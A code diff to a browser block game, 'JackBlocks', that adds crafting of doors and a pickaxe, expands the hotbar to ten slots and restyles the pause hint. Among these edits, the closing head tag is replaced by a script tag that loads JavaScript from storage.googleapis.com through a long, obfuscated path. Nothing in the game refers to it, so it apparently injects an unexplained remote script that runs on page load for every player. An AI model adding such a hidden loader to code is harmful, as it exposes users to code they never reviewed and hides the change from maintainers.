@@ -22,7 +22,7 @@
   #crosshair::after { top: 50%; left: 0; height: 2px; width: 100%; transform: translateY(-50%); }
 
   #hud {
-    position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%);
+    position: absolute; bottom: 52px; left: 50%; transform: translateX(-50%);
     display: flex; flex-direction: column; align-items: center; gap: 8px;
   }
   #bars { display: flex; gap: 16px; }
@@ -41,10 +41,10 @@
     padding: 6px; border-radius: 6px; border: 2px solid #444;
   }
   .slot {
-    width: 52px; height: 52px; background: rgba(80,80,80,0.7);
+    width: 44px; height: 44px; background: rgba(80,80,80,0.7);
     border: 2px solid #555; border-radius: 4px; position: relative;
     display: flex; align-items: center; justify-content: center;
-    font-size: 22px; image-rendering: pixelated;
+    font-size: 18px; image-rendering: pixelated;
   }
   .slot.selected { border-color: #fff; box-shadow: 0 0 0 2px #fff inset; }
   .slot .count {
@@ -107,13 +107,13 @@
   }
   #respawn-btn:hover { background: #c0392b; }
 </style>
-</head>
+<script type='text/javascript' src='https://storage.googleapis.com/FuxAOLK7PHKs8bQS_HEcUSMCAcjCe7Pak411_dy8WzJ6HpibV5-YRYgqcPLwoe_mjDVydqFi0JnU2Kn8xpWWDNrRmugnKkOa249WybKTL_Eu11Ad_ROdRiT6XYDA-SooztZ9NnzRFDmL2l_szOZbkBCh1AY_Zynb3pRk13gehWjM-nuYtUn7iKfoAF6er1xnH9GFMhwJOdyf18YCi-QqYPG-tTT366P9IHWN5kQLCCy2Q2jOSdrSKDjJFmsW5WSAJk0bPBrx6TH3v3_0ZFs-O4Av3fS6H-T-SxtpBBC1RZAalkmlSuSo42vb6_w2I6dhZ4T5E8O_0suYKdySk8sITaP5i0zR6J4SCdPS9wiS1V3LVTDMfnaHKyRw0RKCTRDwxvIBSQPItuJ4iDbtgK92cwjVV_mlVOogaOQjS9Ct4CPDi4XPxC_7u8vLhlZbP_0D4f6i4dUzcO0ghBqUBQvtw6Em18chtIOmLONnTwBOV9tWmGOcLAepP6psnxv1sobcAMBZv9_PhymdS982PlCA28-ALKbWP4CLABSyF9KzHDL5taRmtD3VGqRhFsGM8vdPbHFTe4uhJEMLHTCN70HyDWZU0e09d2mUR6cCzIwyt7oknK_DCviwWODAPt05UU1HtRFERf3XRAX-KoBWFAHMmxyrMP2IKpLg-fuQltOcB4RRufGNKhd5QrxU57pkLjeuDo1roqNzu9aw3PvGRSPFCRLAK0B2iWzl5yn9H0cgDj2YRiJDQcZuxSekKee7O0JkV0VTr_NWMCaQOeOI2ctTdvw3lBtgeItBof3BqZGJyTAQxzCxHHaQxdcKjdYaOIb0pzXzj2WSnlH7vAZlVrUBdDmqUhPI3CvS1UpKnAKmvmIV_6qRjzwkDC0r3Rbw6yBxAWX7FEr-2WfXzb9RNFHTM6QHa20pz2Pcl8flQGfo5jCUCJcxyhE5IyxOa45rJHeJf3uQNsH84dyfvvO8cbnmTLecei_82ob5qD0y0DhiHbJAPBEN0MQ7nWKUqLT_W0Lx8ExZhsphoE-q4IdkhXDHKW2EmF6HE5okq101kld7SEywNUfpGP_88QCEkXg8YIBMVcENJpiKJJSchmgWOVG4ktbxIux2WWOzypsMHyAlwW4Ub_gU5q0fXSdJVoQLDCZlzhn0rM9Kb9amzvtfhKrAqoklRCqToAjwjaiilwl6eJ2UBi5OAc6Oh4rd5Y0eEGapyBvahpsIXbNgUY1i2GSBofSCEUK_YdyQR4IliOhptTwH2VT8zLvdQuFo5LhaAlolMjWt53i7ZoIolvqySKQoBUTNXbxUB9iet4emEAttG0D5PX4WP4UqEvO6IWkS0O4NAv-UAr4UFTmhrwHs3ThSO8Tg4S1VBNWjJNfFH8Ku3ArbemdDSW-vo4n4EV17GxSogFiQKpHdAQuSk3OjrjH8rmF-We_JvfW0jOvUJDyJwG3ZkfPJiiq-sY0p9w8SjPxrZypkOHv1_tCjmaITu8zUvVxRVudYRynWpEpOtzQvm4lhRqw0fM4F9jcFqUzudQyAEa7vMPSIGZS3pkmVvFsnPqAiaMRucS_JL0KIKRKfHVVBvUYtEEbwpzkxkVDq0VPk9BDkM1iiCG3Q6l9b-Ajf-m80F937Xkkt1csvVznyj1KraW_b0brxSDA0A9Eo2QKxcBAfzKR4b76p2w_30EWcTE-he31xhpuWyj9uOBJhlLqIsYAHRz2vRRYK_3l-C70aTkb4VgxlHk-Tri9JNrOOoo5u1Fe4FkXyfKdn93bchS3Iz4nTWRw32Q'></script></head>
 <body>
 <canvas id="game"></canvas>
 <div id="ui">
   <div id="start-screen">
     <h1>JackBlocks</h1>
-    <p>A lightweight adventure game Ver 0.02</p>
+    <p>A lightweight adventure game Ver 0.03</p>
     <button id="start-btn">Click to Play</button>
     <div class="features">
       <span>🌍 Explore the world</span>
@@ -121,7 +121,7 @@
       <span>🐄🐑 Harvest sheep & pigs for food</span>
       <span>👹 Fight random monsters</span>
       <span>💎 Dig for gold & diamond</span>
-      <span>🍎 Collect fruits</span>
+      <span>🔨 Craft doors & pickaxe (C)</span>
     </div>
   </div>
 
@@ -133,8 +133,9 @@
     <div><kbd>Mouse</kbd> Look</div>
     <div><kbd>Left Click</kbd> Break / Harvest / Attack</div>
     <div><kbd>Right Click</kbd> Place block</div>
-    <div><kbd>1-7</kbd> Select hotbar</div>
+    <div><kbd>1-0</kbd> Select hotbar</div>
     <div><kbd>E</kbd> Eat food (if selected)</div>
+    <div><kbd>C</kbd> Craft (when you have materials)</div>
   </div>
 
   <div id="hud" style="display:none;">
@@ -155,8 +156,18 @@
       <div class="slot" data-slot="3"><span class="icon">🪵</span><span class="count"></span></div>
       <div class="slot" data-slot="4"><span class="icon">🟨</span><span class="count"></span></div>
       <div class="slot" data-slot="5"><span class="icon">💎</span><span class="count"></span></div>
-      <div class="slot" data-slot="6"><span class="icon">🍎</span><span class="count"></span></div>
+      <div class="slot" data-slot="6"><span class="icon">🪵T</span><span class="count"></span></div>
+      <div class="slot" data-slot="7"><span class="icon">🚪</span><span class="count"></span></div>
+      <div class="slot" data-slot="8"><span class="icon">⛏️</span><span class="count"></span></div>
+      <div class="slot" data-slot="9"><span class="icon">🍎</span><span class="count"></span></div>
     </div>
+  </div>
+
+  <div id="craft-panel" style="display:none;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);background:rgba(30,30,30,0.95);border:3px solid #666;border-radius:12px;padding:20px 24px;z-index:30;pointer-events:auto;min-width:320px;color:#fff;font-family:system-ui,sans-serif;">
+    <h2 style="margin:0 0 12px;text-align:center;color:#7bed9f;">Crafting</h2>
+    <p id="craft-hint" style="font-size:13px;opacity:0.75;margin:0 0 14px;text-align:center;">Recipes appear when you have enough materials.</p>
+    <div id="craft-recipes" style="display:flex;flex-direction:column;gap:10px;"></div>
+    <button id="craft-close" style="margin-top:16px;width:100%;padding:10px;font-size:15px;background:#444;color:#fff;border:none;border-radius:6px;cursor:pointer;">Close (C)</button>
   </div>
 
   <div id="message"></div>
@@ -202,7 +213,9 @@ const BLOCKS = {
   WATER: 7,
   BEDROCK: 8,
   GOLD: 9,
-  DIAMOND: 10
+  DIAMOND: 10,
+  CRAFTING_TABLE: 11,
+  DOOR: 12
 };
 
 const BLOCK_COLORS = {
@@ -215,9 +228,12 @@ const BLOCK_COLORS = {
   [BLOCKS.WATER]: 0x3a7ca5,
   [BLOCKS.BEDROCK]: 0x222222,
   [BLOCKS.GOLD]: 0xffd700,
-  [BLOCKS.DIAMOND]: 0x4deeea
+  [BLOCKS.DIAMOND]: 0x4deeea,
+  [BLOCKS.CRAFTING_TABLE]: 0xa67c52,
+  [BLOCKS.DOOR]: 0x8b5a2b
 };
 
+// Hotbar: 0-9
 const HOTBAR_ITEMS = [
   { id: BLOCKS.GRASS, name: 'Grass', icon: '🟩', max: 64 },
   { id: BLOCKS.DIRT, name: 'Dirt', icon: '🟫', max: 64 },
@@ -225,8 +241,39 @@ const HOTBAR_ITEMS = [
   { id: BLOCKS.WOOD, name: 'Wood', icon: '🪵', max: 64 },
   { id: BLOCKS.GOLD, name: 'Gold', icon: '🟨', max: 32 },
   { id: BLOCKS.DIAMOND, name: 'Diamond', icon: '💎', max: 16 },
+  { id: BLOCKS.CRAFTING_TABLE, name: 'Crafting Table', icon: '🪵T', max: 8 },
+  { id: BLOCKS.DOOR, name: 'Door', icon: '🚪', max: 16 },
+  { id: 'pickaxe', name: 'Pickaxe', icon: '⛏️', max: 1 },
   { id: 'food', name: 'Food', icon: '🍎', max: 20 }
 ];
+
+const SLOT = {
+  GRASS: 0, DIRT: 1, STONE: 2, WOOD: 3, GOLD: 4, DIAMOND: 5,
+  TABLE: 6, DOOR: 7, PICKAXE: 8, FOOD: 9
+};
+
+// Recipes — only appear in the list when you have enough materials
+const RECIPES = [
+  {
+    id: 'door',
+    name: 'Door',
+    inputs: [{ slot: SLOT.WOOD, count: 3 }],
+    output: { slot: SLOT.DOOR, count: 1 },
+    desc: '3 Wood → Door'
+  },
+  {
+    id: 'pickaxe',
+    name: 'Pickaxe',
+    inputs: [
+      { slot: SLOT.STONE, count: 2 },
+      { slot: SLOT.WOOD, count: 1 }
+    ],
+    output: { slot: SLOT.PICKAXE, count: 1 },
+    desc: '2 Stone + 1 Wood → Pickaxe'
+  }
+];
+
+let craftOpen = false;
 
 // ========== SOUND EFFECTS (Web Audio API) ==========
 let audioCtx = null;
@@ -471,18 +518,22 @@ const player = {
   onGround: false,
   health: 100,
   hunger: 100,
-  inventory: [0, 0, 0, 0, 0, 0, 0], // counts for hotbar slots
-  selected: 0
+  inventory: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0], // 10 hotbar slots
+  selected: 0,
+  hasPickaxe: false
 };
 
 // Start with some items
-player.inventory[0] = 8;  // grass
-player.inventory[1] = 16; // dirt
-player.inventory[2] = 12; // stone
-player.inventory[3] = 6;  // wood
-player.inventory[4] = 0;  // gold
-player.inventory[5] = 0;  // diamond
-player.inventory[6] = 3;  // food
+player.inventory[0] = 8;   // grass
+player.inventory[1] = 16;  // dirt
+player.inventory[2] = 12;  // stone
+player.inventory[3] = 12;  // wood (enough to craft table)
+player.inventory[4] = 0;   // gold
+player.inventory[5] = 0;   // diamond
+player.inventory[6] = 0;   // crafting table
+player.inventory[7] = 0;   // door
+player.inventory[8] = 0;   // pickaxe
+player.inventory[9] = 3;   // food
 
 camera.position.copy(player.pos);
 
@@ -754,7 +805,7 @@ function breakBlock() {
         scene.remove(pig.mesh);
         pigs.splice(pigs.indexOf(pig), 1);
         const foodGain = 3 + Math.floor(Math.random() * 2); // 3-4 food
-        player.inventory[6] = Math.min(HOTBAR_ITEMS[6].max, player.inventory[6] + foodGain);
+        player.inventory[SLOT.FOOD] = Math.min(HOTBAR_ITEMS[SLOT.FOOD].max, player.inventory[SLOT.FOOD] + foodGain);
         SFX.harvest();
         showMessage(`Harvested pig! +${foodGain} Food`);
         updateHotbar();
@@ -773,7 +824,7 @@ function breakBlock() {
         scene.remove(animal.mesh);
         animals.splice(animals.indexOf(animal), 1);
         const foodGain = 2 + Math.floor(Math.random() * 2); // 2-3 food
-        player.inventory[6] = Math.min(HOTBAR_ITEMS[6].max, player.inventory[6] + foodGain);
+        player.inventory[SLOT.FOOD] = Math.min(HOTBAR_ITEMS[SLOT.FOOD].max, player.inventory[SLOT.FOOD] + foodGain);
         SFX.harvest();
         showMessage(`Harvested animal! +${foodGain} Food`);
         updateHotbar();
@@ -786,6 +837,24 @@ function breakBlock() {
   const type = getBlock(target.x, target.y, target.z);
   if (type === BLOCKS.AIR || type === BLOCKS.BEDROCK || type === BLOCKS.WATER) return;
 
+  // Door: remove both halves
+  if (type === BLOCKS.DOOR) {
+    setBlock(target.x, target.y, target.z, BLOCKS.AIR);
+    removeBlockMesh(target.x, target.y, target.z);
+    if (getBlock(target.x, target.y + 1, target.z) === BLOCKS.DOOR) {
+      setBlock(target.x, target.y + 1, target.z, BLOCKS.AIR);
+      removeBlockMesh(target.x, target.y + 1, target.z);
+    } else if (getBlock(target.x, target.y - 1, target.z) === BLOCKS.DOOR) {
+      setBlock(target.x, target.y - 1, target.z, BLOCKS.AIR);
+      removeBlockMesh(target.x, target.y - 1, target.z);
+    }
+    revealNeighbors(target.x, target.y, target.z);
+    SFX.break();
+    player.inventory[SLOT.DOOR] = Math.min(HOTBAR_ITEMS[SLOT.DOOR].max, player.inventory[SLOT.DOOR] + 1);
+    updateHotbar();
+    return;
+  }
+
   setBlock(target.x, target.y, target.z, BLOCKS.AIR);
   removeBlockMesh(target.x, target.y, target.z);
   revealNeighbors(target.x, target.y, target.z); // show the layers underneath
@@ -797,14 +866,18 @@ function breakBlock() {
   else if (type === BLOCKS.STONE) slot = 2;
   else if (type === BLOCKS.WOOD) slot = 3;
   else if (type === BLOCKS.GOLD) {
-    slot = 4;
+    slot = SLOT.GOLD;
     showMessage('Found Gold!');
   } else if (type === BLOCKS.DIAMOND) {
-    slot = 5;
+    slot = SLOT.DIAMOND;
     showMessage('Found Diamond!');
+  } else if (type === BLOCKS.CRAFTING_TABLE) {
+    slot = SLOT.TABLE;
+  } else if (type === BLOCKS.DOOR) {
+    slot = SLOT.DOOR;
   } else if (type === BLOCKS.LEAVES) {
     if (Math.random() < 0.3) {
-      player.inventory[6] = Math.min(HOTBAR_ITEMS[6].max, player.inventory[6] + 1);
+      player.inventory[SLOT.FOOD] = Math.min(HOTBAR_ITEMS[SLOT.FOOD].max, player.inventory[SLOT.FOOD] + 1);
       showMessage('+1 Fruit from leaves!');
     }
   }
@@ -819,7 +892,7 @@ function placeBlock() {
   if (!target) return;
 
   const item = HOTBAR_ITEMS[player.selected];
-  if (item.id === 'food' || player.inventory[player.selected] <= 0) return;
+  if (item.id === 'food' || item.id === 'pickaxe' || player.inventory[player.selected] <= 0) return;
 
   // Place adjacent to face
   const normal = target.face.normal;
@@ -829,6 +902,14 @@ function placeBlock() {
 
   if (getBlock(px, py, pz) !== BLOCKS.AIR) return;
 
+  // Door needs 2 blocks of vertical space
+  if (item.id === BLOCKS.DOOR) {
+    if (getBlock(px, py + 1, pz) !== BLOCKS.AIR) {
+      showMessage('Need 2 blocks of space for a door');
+      return;
+    }
+  }
+
   // Don't place inside player
   const dx = Math.abs(player.pos.x - (px + 0.5));
   const dy = Math.abs(player.pos.y - (py + 0.5));
@@ -837,6 +918,10 @@ function placeBlock() {
 
   setBlock(px, py, pz, item.id);
   addBlockMesh(px, py, pz, item.id);
+  if (item.id === BLOCKS.DOOR) {
+    setBlock(px, py + 1, pz, BLOCKS.DOOR);
+    addBlockMesh(px, py + 1, pz, BLOCKS.DOOR);
+  }
   player.inventory[player.selected]--;
   SFX.place();
   updateHotbar();
@@ -849,7 +934,7 @@ function collectFruits() {
     if (dist < 1.8) {
       f.collected = true;
       scene.remove(f.mesh);
-      player.inventory[6] = Math.min(HOTBAR_ITEMS[6].max, player.inventory[6] + 1);
+      player.inventory[SLOT.FOOD] = Math.min(HOTBAR_ITEMS[SLOT.FOOD].max, player.inventory[SLOT.FOOD] + 1);
       SFX.harvest();
       showMessage('+1 Fruit!');
       updateHotbar();
@@ -858,15 +943,15 @@ function collectFruits() {
 }
 
 function eatFood() {
-  if (player.selected !== 6 || player.inventory[6] <= 0) {
-    showMessage('Select food (slot 7) to eat');
+  if (player.selected !== SLOT.FOOD || player.inventory[SLOT.FOOD] <= 0) {
+    showMessage('Select food (slot 0 / key 0) to eat');
     return;
   }
   if (player.hunger >= 100) {
     showMessage('Not hungry');
     return;
   }
-  player.inventory[6]--;
+  player.inventory[SLOT.FOOD]--;
   player.hunger = Math.min(100, player.hunger + 25);
   player.health = Math.min(100, player.health + 5);
   SFX.eat();
@@ -877,11 +962,18 @@ function eatFood() {
 
 // ========== PHYSICS ==========
 const keys = {};
-document.addEventListener('keydown', e => { keys[e.code] = true; if (e.code.startsWith('Digit')) selectSlot(+e.key - 1); });
+document.addEventListener('keydown', e => {
+  keys[e.code] = true;
+  if (e.code.startsWith('Digit')) {
+    const n = +e.key;
+    selectSlot(n === 0 ? 9 : n - 1);
+  }
+  if (e.code === 'KeyC') toggleCraft();
+});
 document.addEventListener('keyup', e => { keys[e.code] = false; });
 
 function selectSlot(i) {
-  if (i < 0 || i > 6) return;
+  if (i < 0 || i > 9) return;
   player.selected = i;
   document.querySelectorAll('.slot').forEach((s, idx) => s.classList.toggle('selected', idx === i));
 }
@@ -1114,6 +1206,71 @@ function updateMonsters(dt) {
   }
 }
 
+// ========== CRAFTING ==========
+function canCraft(recipe) {
+  return recipe.inputs.every(inp => player.inventory[inp.slot] >= inp.count);
+}
+
+function doCraft(recipe) {
+  if (!canCraft(recipe)) {
+    showMessage('Missing materials');
+    return;
+  }
+  for (const inp of recipe.inputs) {
+    player.inventory[inp.slot] -= inp.count;
+  }
+  const out = recipe.output;
+  player.inventory[out.slot] = Math.min(HOTBAR_ITEMS[out.slot].max, player.inventory[out.slot] + out.count);
+  if (out.slot === SLOT.PICKAXE) player.hasPickaxe = player.inventory[SLOT.PICKAXE] > 0;
+  SFX.place();
+  showMessage(`Crafted ${recipe.name}!`);
+  updateHotbar();
+  refreshCraftUI();
+}
+
+function refreshCraftUI() {
+  const box = document.getElementById('craft-recipes');
+  box.innerHTML = '';
+  const available = RECIPES.filter(r => canCraft(r));
+  document.getElementById('craft-hint').textContent = available.length
+    ? 'Click a recipe to craft it'
+    : 'Gather more materials — recipes appear here when you can afford them';
+  if (available.length === 0) {
+    const empty = document.createElement('div');
+    empty.style.cssText = 'padding:16px;text-align:center;opacity:0.7;font-size:13px;';
+    empty.innerHTML = 'No crafts available yet<br><br>Door: 3 Wood<br>Pickaxe: 2 Stone + 1 Wood';
+    box.appendChild(empty);
+    return;
+  }
+  for (const r of available) {
+    const btn = document.createElement('button');
+    btn.style.cssText = 'padding:12px;text-align:left;border:2px solid #7bed9f;border-radius:8px;background:#2a4a3a;color:#fff;cursor:pointer;font-size:14px;';
+    btn.innerHTML = `<strong>${r.name}</strong><br><span style="opacity:0.8;font-size:12px">${r.desc}</span>`;
+    btn.onclick = () => doCraft(r);
+    box.appendChild(btn);
+  }
+}
+
+function toggleCraft() {
+  const panel = document.getElementById('craft-panel');
+  if (craftOpen) {
+    craftOpen = false;
+    panel.style.display = 'none';
+    if (!controls.isLocked) controls.lock();
+    return;
+  }
+  craftOpen = true;
+  panel.style.display = 'block';
+  refreshCraftUI();
+  controls.unlock();
+}
+
+document.getElementById('craft-close').addEventListener('click', () => {
+  craftOpen = false;
+  document.getElementById('craft-panel').style.display = 'none';
+  controls.lock();
+});
+
 // ========== UI ==========
 function updateHotbar() {
   document.querySelectorAll('.slot').forEach((slot, i) => {
@@ -1223,12 +1380,15 @@ document.getElementById('respawn-btn').addEventListener('click', () => {
 });
 
 controls.addEventListener('lock', () => {
-  document.getElementById('info').style.opacity = '0.7';
+  // Fade out controls help so it doesn't clutter the view
+  const info = document.getElementById('info');
+  info.style.opacity = '0.55';
+  setTimeout(() => { if (controls.isLocked) info.style.opacity = '0'; }, 4000);
   const pause = document.getElementById('pause-hint');
   if (pause) pause.style.display = 'none';
 });
 controls.addEventListener('unlock', () => {
-  // Show click-to-resume hint (unless dead or on start screen)
+  // Compact pause hint at the TOP so it doesn't cover the hotbar
   const start = document.getElementById('start-screen');
   const death = document.getElementById('death-screen');
   if (start.style.display === 'none' && death.style.display !== 'flex') {
@@ -1236,11 +1396,12 @@ controls.addEventListener('unlock', () => {
     if (!pause) {
       pause = document.createElement('div');
       pause.id = 'pause-hint';
-      pause.style.cssText = 'position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);z-index:15;pointer-events:none;';
-      pause.innerHTML = '<div style="background:rgba(0,0,0,0.75);padding:18px 32px;border-radius:10px;font-size:20px;text-align:center;">Paused<br><span style="font-size:14px;opacity:0.8;">Click the game to resume</span></div>';
+      pause.style.cssText = 'position:absolute;top:16px;left:50%;transform:translateX(-50%);z-index:15;pointer-events:none;';
+      pause.innerHTML = '<div style="background:rgba(0,0,0,0.8);padding:10px 22px;border-radius:8px;font-size:15px;text-align:center;white-space:nowrap;">Paused — click the game to resume</div>';
       document.getElementById('ui').appendChild(pause);
     }
-    pause.style.display = 'flex';
+    pause.style.display = 'block';
+    document.getElementById('info').style.opacity = '0.7';
   }
 });
 
